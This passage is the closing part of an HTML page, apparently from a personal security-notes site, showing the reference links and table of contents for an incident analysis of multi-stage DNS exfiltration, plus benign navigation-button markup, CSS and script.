+</ul></div><div class="el-h5"><h5 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h5></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span><a data-tooltip-position="top" aria-label="https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/" rel="noopener nofollow" class="external-link is-unresolved" href="https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/" target="_self">Mark of the Web Bypass - Red Canary Threat Detection Report</a></li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/enterprise/" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/enterprise/" target="_self">Techniques - Enterprise | MITRE ATT&amp;CK®</a></li>
+</ul></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#Incident_Analysis_-_Multi-Stage_DNS_Exfiltration_0" data-path="#Incident_Analysis_-_Multi-Stage_DNS_Exfiltration_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Incident Analysis - Multi-Stage DNS Exfiltration">Incident Analysis - Multi-Stage DNS Exfiltration</div></a><div class="tree-item-children"><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#I._Executive_Summary_0" data-path="#I._Executive_Summary_0"><div class="tree-item-inner heading-link" heading-name="I. Executive Summary">I. Executive Summary</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#II_Attack_Chain_Overview_(MITRE_ATT&amp;CK)_0" data-path="#II_Attack_Chain_Overview_(MITRE_ATT&amp;CK)_0"><div class="tree-item-inner heading-link" heading-name="II Attack Chain Overview (MITRE ATT&amp;CK)">II Attack Chain Overview (MITRE ATT&amp;CK)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#III._Incident_Analysis_and_Alert_Correlation_0" data-path="#III._Incident_Analysis_and_Alert_Correlation_0"><div class="tree-item-inner heading-link" heading-name="III. Incident Analysis and Alert Correlation">III. Incident Analysis and Alert Correlation</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#3.1_Initial_Access_0" data-path="#3.1_Initial_Access_0"><div class="tree-item-inner heading-link" heading-name="3.1 Initial Access">3.1 Initial Access</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#3.2_Execution_Chain_0" data-path="#3.2_Execution_Chain_0"><div class="tree-item-inner heading-link" heading-name="3.2 Execution Chain">3.2 Execution Chain</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#IV._Findings_0" data-path="#IV._Findings_0"><div class="tree-item-inner heading-link" heading-name="IV. Findings">IV. Findings</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/incident-analysis-multi-stage-dns-exfiltration.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><div class="graph-view-wrapper"><div class="feature-header"><div class="feature-title">Interactive Graph</div></div><div class="graph-view-placeholder">
+		<div class="graph-view-container">
+			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
+			<div class="graph-icon graph-global" role="button" aria-label="Global Graph" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-git-fork"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></div>
+			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
+		</div>
+		</div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div>
+<!-- Navigation Buttons -->
+<div class="nav-buttons">
+  <button class="nav-btn nav-back" id="navBack" title="Go back" aria-label="Navigate back">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 18l-6-6 6-6"></path>
+    </svg>
+  </button>
+  
+  <button class="nav-btn nav-home" id="navHome" title="Go to home" aria-label="Navigate to home">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+      <polyline points="9 22 9 12 15 12 15 22"></polyline>
+    </svg>
+  </button>
+  
+  <button class="nav-btn nav-forward" id="navForward" title="Go forward" aria-label="Navigate forward">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M9 18l6-6-6-6"></path>
+    </svg>
+  </button>
+</div>
+
+<style>
+:root {
+  /* Navigation Button Colors */
+  --nav-bg: #20242B;
+  --nav-border: #424958;
+  --nav-icon-color: #888888;
+  --nav-icon-hover: #DCDDDE;
+  --nav-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  --nav-glow: 0 0 10px rgba(97, 175, 239, 0.15);
+  --nav-accent: #61AFEF;
+  --nav-transition: all 0.2s ease-in-out;
+}
+
+.nav-buttons {
+  position: fixed;
+  bottom: 2rem;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 12px;
+  z-index: 1000;
+  background: rgba(32, 36, 43, 0.85);
+  backdrop-filter: blur(8px);
+  padding: 10px 14px;
+  border-radius: 12px;
+  box-shadow: var(--nav-shadow);
+  border: 1px solid rgba(66, 73, 88, 0.6);
+  animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+.nav-btn {
+  width: 44px;
+  height: 44px;
+  border: 1px solid var(--nav-border);
+  border-radius: 8px;
+  background: var(--nav-bg);
+  color: var(--nav-icon-color);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: var(--nav-transition);
+  padding: 0;
+  font: inherit;
+  flex-shrink: 0;
+}
+
+.nav-btn:hover:not(:disabled) {
+  color: var(--nav-icon-hover);
+  border-color: var(--nav-accent);
+  transform: translateY(-3px);
+  box-shadow: var(--nav-glow);
+}
+
+.nav-btn:active:not(:disabled) {
+  transform: translateY(-1px);
+  box-shadow: 0 0 8px rgba(97, 175, 239, 0.2);
+}
+
+.nav-btn:disabled {
+  border-color: rgba(66, 73, 88, 0.3);
+  color: rgba(136, 136, 136, 0.4);
+  cursor: not-allowed;
+  opacity: 0.5;
+}
+
+.nav-btn svg {
+  width: 20px;
+  height: 20px;
+  stroke-width: 2;
+}
+
+/* Focus state for keyboard navigation */
+.nav-btn:focus-visible {
+  outline: none;
+  border-color: var(--nav-accent);
+  box-shadow: var(--nav-glow);
+}
+
+/* Responsive: Hide back/forward on mobile, keep home */
+@media (max-width: 768px) {
+  .nav-buttons {
+    gap: 8px;
+    padding: 8px 10px;
+  }
+
+  .nav-btn {
+    width: 40px;
+    height: 40px;
+  }
+
+  .nav-btn.nav-back,
+  .nav-btn.nav-forward {
+    display: none;
+  }
+
+  .nav-btn svg {
+    width: 18px;
+    height: 18px;
+  }
+}
+
+/* Tablet: Reduce size slightly */
+@media (max-width: 1024px) {
+  .nav-buttons {
+    bottom: 1.5rem;
+  }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const backBtn = document.getElementById('navBack');
+  const homeBtn = document.getElementById('navHome');
+  const forwardBtn = document.getElementById('navForward');
+  
+  if (!backBtn || !homeBtn || !forwardBtn) return;
+  
+  // Check if back is available
+  function updateNavButtons() {
+    backBtn.disabled = !window.history.length || window.history.length <= 1;
+  }
+  
+  backBtn.addEventListener('click', () => window.history.back());
+  forwardBtn.addEventListener('click', () => window.history.forward());
+  homeBtn.addEventListener('click', () => window.location.href = 'index.html');
+  
+  updateNavButtons();
+  
+  // Update on navigation
+  window.addEventListener('pageshow', updateNavButtons);
+});
+</script>
+
+</body></html>
